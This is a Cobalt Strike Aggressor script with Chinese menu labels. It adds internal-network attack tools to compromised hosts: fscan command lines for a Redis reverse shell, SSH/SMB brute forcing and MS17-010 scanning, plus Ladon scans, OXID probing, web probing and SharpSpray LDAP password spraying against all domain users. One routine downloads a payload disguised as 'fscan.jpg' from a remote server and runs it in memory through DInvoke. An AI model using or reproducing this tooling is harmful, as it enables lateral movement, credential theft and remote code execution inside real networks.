include(script_resource("config.cna"));

menu "☆ 内网扫描" {

    item "Fscan" {
        blog($1, "\c9=========== 运行 Fscan ==========");
        $bid = $1['@'];
        btask($bid, "fscan.exe -h 192.168.1.1/24 -np -no -nopoc                     (跳过存活检测、不保存文件、跳过web poc扫描)", "");            
        btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub                     (redis 写公钥)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666               (redis 计划任务反弹shell)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt     (加载指定文件的用户名、密码来进行爆破)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt                      (指定扫描结果保存路径,默认保存在当前路径)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/8                                     (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/24 -m smb -pwd password               (smb密码碰撞)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami                          (ssh 爆破成功后，命令执行)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222                     (指定模块ssh和端口)", "");
        btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010                         (指定模块)", "");
        btask($bid, "fscan.exe -h 192.0.0.0/8 -m icmp                               (探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)", "");

        # 创建对话框，设置默认参数
        $Dialog = dialog("运行fscan", %(iprange => "192.168.1.0/24", cmdparams => "-no", bid => $bid), &run_fscan);

        # 设置对话框描述
        dialog_description($Dialog, "请在下方输入运行指令：");

        # 添加 IP 段输入框，默认值为 192.168.1.0/24
        drow_text($Dialog, "iprange", "IP 段: ");
        
        # 添加命令行参数输入框，默认值为 -no
        drow_text($Dialog, "cmdparams", "命令行参数: ");

        # 添加运行按钮
        dbutton_action($Dialog, "运行");

        # 显示对话框
        dialog_show($Dialog);
    }


sub run_fscan {
    local('$iprange $cmdparams $exe $param');
    $iprange = $3['iprange'];
    $cmdparams = $3['cmdparams'];
    $b64 = base64_encode("-h $iprange $cmdparams");

    # 打印日志
    #blog($3['bid'], "\c9正在运行 fscan 扫描...");

    # 构建执行命令
    $exe = script_resource("/scripts/DInvoke.exe");
    $param = "--url " . $url . "/IntrScan/x64/fscan.jpg --config " . $b64;

    # 打印最终执行的命令
    #blog2($bid, "最终执行的命令: $exe $param");

    # 执行命令
    bexecute_assembly!($bid, $exe, $param);

}
    item "Ladon（多协议存活探测）" {
        #OnlinePC
        $bid = $1;
        $dialog = dialog("Ladon OnlineIP", %(tar => "192.168.1.1/24",moudle => "OnlineIP",clrver => "35",bid => $bid), &LadonScan);
        dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
        drow_text($dialog, "tar",  "Target:");
        drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","OnlineIP","EthScan", "WebScan", "WhatCMS","CiscoScan","SameWeb","UrlScan","EnumMssql","EnumShare"));
        #drow_combobox($dialog, "clrver", "Version", @("35", "40"));
        drow_checkbox($dialog, 'type', 'noping');
        dbutton_action($dialog, "Scan");
        dialog_show($dialog);
        }
    sub LadonScan {
        if (-exists script_resource("/scripts/InfoCollect/Ladon.exe")) {
        if ($3['tar'] eq ""){
        return;
        }else
        {
        if ($3['type'] eq 'true'){
        blog2($bid,"\c2Ladon noping ".$3['tar'].' '.$3['moudle']);
        bexecute_assembly!($bid, script_resource("/scripts/InfoCollect/Ladon.exe"),'noping '.$3['tar'].' '.$3['moudle']);
        }else
        {
        blog2($bid,"\c2Ladon ".$3['tar'].' '.$3['moudle']);
        bexecute_assembly!($bid, script_resource("/scripts/InfoCollect/Ladon.exe"), $3['tar'].' '.$3['moudle']);}}
        }else {berror($1, "Ladon.exe does not exist :(");}
    }


  item "SharpOXID-Find (OXID 探测)" {
			blog($1, "\c9=========== SharpOXID-Find (OXID 探测) ==========");
      $bid = $1['@'];
      $dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
      dialog_description($dialog, "OXID 解析器，用于探测多网口机器（依赖于 135 端口）,-i 扫描指定ip,-c 扫描C段。");
      drow_combobox($dialog, "type", "type:", @("-c","-i"));
      drow_text($dialog, "ip", "ip:  ");			
      dbutton_action($dialog, "运行");
      dialog_show($dialog);
  }
  sub SharpOXID-Find {
      $arg = join(' ',  @($3['type'],$3['ip']));
      bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpOXID-Find.exe"), $arg);
  }

  item "SharpWebScan (Web 探测)" {
			blog($1, "\c9=========== SharpWebScan (Web 探测) ==========");
    $bid = $1['@'];
    $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
    dialog_description($dialog, "扫描IP或C段的Web服务，获取Title，可自定义多端口扫描，返回web地址和title。项目地址：https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
    drow_text($dialog, "ip", "ip:  ");
    drow_text($dialog, "port", "ports:  ");
    drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
    dbutton_action($dialog, "运行");
    dialog_show($dialog);
  }
  sub SharpWebScan (Web 服务) {
    $arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpWebScan.exe"), $arg);
  }

  item "SharpSpray (域内密码爆破)" {
			blog($1, "\c9=========== SharpSpray (域内密码爆破) ==========");
    $bid = $1['@'];
    $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
    dialog_description($dialog, "使用LDAP对域的所有用户执行密码喷雾攻击。seeds：指定几个密码生成字典，逗号分隔。passwords：指定密码爆破，可多个密码，逗号分隔。delay：密码喷雾的延迟，毫秒为单位。sleep：密码猜测之间sleep周期分钟数。项目地址：https://github.com/jnqpblc/SharpSpray");
    drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
    drow_text($dialog, "passwd", "passwd:  ");
    drow_text($dialog, "Delay", "Delay:  ");
    drow_text($dialog, "Sleep", "Sleep:  ");
    dbutton_action($dialog, "运行");
    dialog_show($dialog);
  }
  sub SharpSpray {
    $arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpSpray.exe"), $arg);
  }
}